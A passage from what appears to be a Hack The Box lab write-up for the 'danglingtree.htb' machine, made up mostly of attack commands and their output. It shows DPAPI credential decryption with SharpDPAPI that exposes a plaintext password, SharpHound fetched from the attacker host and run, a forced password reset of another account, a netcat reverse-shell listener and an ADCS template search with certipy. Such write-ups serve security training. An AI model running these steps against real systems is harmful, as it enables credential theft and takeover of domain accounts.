[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f
[*] Preferred master keys:
C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602:f377b93a-115f-4f68-991b-1813a39bfc25

[*] User master key cache:
{f377b93a-115f-4f68-991b-1813a39bfc25}:DC35C8C37451F9507FE7F6D6AA750F526D7F90BF
{f53fcaba-f057-48e8-8f92-0180d274bf0f}:9979EAB03C0DF45C93ED2D50DB01EC6A6835B818

[*] Triaging Vaults for the current user
[*] Triaging Vault folder: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Name               : Web Credentials
    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
    size             : 324
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : 
    aes128 key       : 469780F62BBDA21BBE780EDEDB7B84CE
    aes256 key       : 46A2C74F9D09C172A8583952845B1FD888E32C4A267D4642217EB804FB299EA7

SharpDPAPI completed in 00:00:00.1544137

PS C:\Users\Public> .\SharpDPAPI.exe credentials /password:"RiverDragon#Storm25"
  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.3                               

[*] Action: User DPAPI Credential Triage
[*] Will decrypt user masterkeys with password: RiverDragon#Storm25
[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f377b93a-115f-4f68-991b-1813a39bfc25
[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f
[*] Preferred master keys:
C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602:f377b93a-115f-4f68-991b-1813a39bfc25

[*] User master key cache:
{f377b93a-115f-4f68-991b-1813a39bfc25}:DC35C8C37451F9507FE7F6D6AA750F526D7F90BF
{f53fcaba-f057-48e8-8f92-0180d274bf0f}:9979EAB03C0DF45C93ED2D50DB01EC6A6835B818

[*] Triaging Credentials for current user

Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
  CredFile           : 57FFB67D684C67F09E7153B9C7CC3940
    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
    size             : 490
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data
    LastWritten      : 3/27/2026 3:03:38 PM
    TargetName       : Domain:target=PC01.danglingtree.htb
    TargetAlias      : 
    Comment          : 
    UserName         : alex.o
    Credential       : SunsetMountainPeak@2025

  CredFile           : 669577566E0F86A3BB614E0B17AFF1B2
    guidMasterKey    : {f377b93a-115f-4f68-991b-1813a39bfc25}
    size             : 474
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data
    LastWritten      : 8/16/2026 6:11:26 PM
    TargetName       : Domain:interactive=danglingtree\alex.o
    TargetAlias      : 
    Comment          : 
    UserName         : danglingtree\alex.o
    Credential       : 

SharpDPAPI completed in 00:00:00.1969564
```

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nxc smb 10.129.10.114 -u 'alex.o' -p 'SunsetMountainPeak@2025'        
SMB         10.129.10.114   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.114   445    DC               [+] danglingtree.htb\alex.o:SunsetMountainPeak@2025 
```

cant get shell as alex.o

#### alex.o to jake.h (ForceChangePassword)

```
PS C:\Users\noah.b\Documents> Invoke-WebRequest http://10.10.14.183:8888/sharphound.exe -UseBasicParsing -OutFile sharphound.exe
PS C:\Users\noah.b\Documents> .\sharphound.exe
2026-08-17T00:59:53.6026049-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-08-17T00:59:53.6263181-07:00|INFORMATION|SharpHound Version: 2.9.0.0
2026-08-17T00:59:53.6263181-07:00|INFORMATION|SharpHound Common Version: 4.5.2.0
2026-08-17T00:59:53.7253200-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2026-08-17T00:59:53.7553710-07:00|INFORMATION|Initializing SharpHound at 12:59 AM on 8/17/2026
2026-08-17T00:59:53.8123219-07:00|INFORMATION|Resolved current domain to danglingtree.htb
2026-08-17T00:59:53.9977529-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2026-08-17T00:59:54.0892261-07:00|INFORMATION|Beginning LDAP search for danglingtree.htb
...
...
2026-08-17T01:00:02.8637409-07:00|INFORMATION|SharpHound Enumeration Completed at 1:00 AM on 8/17/2026! Happy Graphing!
```

<img width="1824" height="894" alt="image" src="https://github.com/user-attachments/assets/ef29e8a1-2dc9-4664-a2ee-0494c9158182" />

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ net rpc password "jake.h" "newP@ssword2022" -U "danglingtree.htb"/"alex.o"%"SunsetMountainPeak@2025" -S "dc.danglingtree.htb"
         
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nxc smb 10.129.10.114 -u 'jake.h' -p 'newP@ssword2022'                              
SMB         10.129.10.114   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.114   445    DC               [+] danglingtree.htb\jake.h:newP@ssword2022
```

<img width="1536" height="864" alt="image" src="https://github.com/user-attachments/assets/60756e4e-c5c8-4246-8fcb-a8237f68cbfa" />
<img width="1212" height="659" alt="image" src="https://github.com/user-attachments/assets/70c0eae0-7ec9-4bc9-a6d5-84099c4c9ae4" />
```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nc -lvnp 9999                                                  
listening on [any] 9999 ...
connect to [10.10.14.183] from (UNKNOWN) [10.129.10.114] 51044

PS C:\Users\jake.h\Documents> whoami
danglingtree\jake.h
```

### ADCS To Administrator + root flag

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ certipy-ad find -u 'jake.h@danglingtree.htb' -p 'newP@ssword2022' -dc-ip 10.129.10.114 -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
[*] Saving text output to '20260818090527_Certipy.txt'
[*] Wrote text output to '20260818090527_Certipy.txt'
[*] Saving JSON output to '20260818090527_Certipy.json'
[*] Wrote JSON output to '20260818090527_Certipy.json'
```

<img width="1782" height="931" alt="image" src="https://github.com/user-attachments/assets/b6c4fec0-370b-400c-8b8f-ab786273927c" />
<img width="1025" height="686" alt="image" src="https://github.com/user-attachments/assets/0574789b-5bcb-4e93-ba47-f45fa93b494a" />

